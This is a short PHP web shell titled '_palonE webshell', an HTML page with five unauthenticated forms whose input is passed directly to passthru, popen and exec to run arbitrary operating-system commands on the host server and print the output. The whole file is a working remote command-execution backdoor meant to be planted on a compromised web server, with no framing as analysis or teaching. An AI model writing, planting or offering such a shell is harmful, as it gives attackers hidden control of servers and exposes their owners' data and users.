<html>

<head>
    <title>_palonE webshell</title>
</head>
<body>
    <div>
        <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="post">
            <label for="passthru">passthru</label>
            <input type="text" name="passthru_cmd" placeholder="passthru" id="passthru">
            <input type="submit">
        </form>

        <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="post">
            <label for="system">system</label>
            <input type="text" name="system_cmd" placeholder="system" id="system">
            <input type="submit">
        </form>

        <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="post">
            <label for="shell_exec">shell_exec</label>
            <input type="text" name="shell_exec_cmd" placeholder="shell_exec" id="shell_exec">
            <input type="submit">
        </form>

        <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="post">
            <label for="popen_cmd">popen</label>
            <input type="text" name="popen_cmd" placeholder="popen_cmd" id="popen_cmd">
            <input type="submit">
        </form>

        <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="post">
            <label for="exec">exec</label>
            <input type="text" name="exec_cmd" placeholder="exec" id="exec">
            <input type="submit">
        </form>
    </div>

    <pre style="white-space: pre-line;">
        <?php
        if (isset($_POST['passthru_cmd'])) {
            passthru($_POST['passthru_cmd']);
        }

        if (isset($_POST['system_cmd'])) {
            passthru($_POST['system_cmd']);
        }

        if (isset($_POST['shell_exec_cmd'])) {
            passthru($_POST['shell_exec_cmd']);
        }

        if (isset($_POST['popen_cmd'])) {
            //start command and output console
            while (@ ob_end_flush()); // end all output buffers if any
            $proc = popen($_POST['popen_cmd'], 'r');
            echo '<pre>';
            while (!feof($proc))
            {
                echo fread($proc, 4096);
                @ flush();
            }
            pclose($proc);
            echo '</pre>';
            echo '</body>';
        }

        if (isset($_POST['exec_cmd'])) {
            exec($_POST['exec_cmd'], $out);
            print_r($out);
        }
        ?>
    </pre>

</body>

</html>
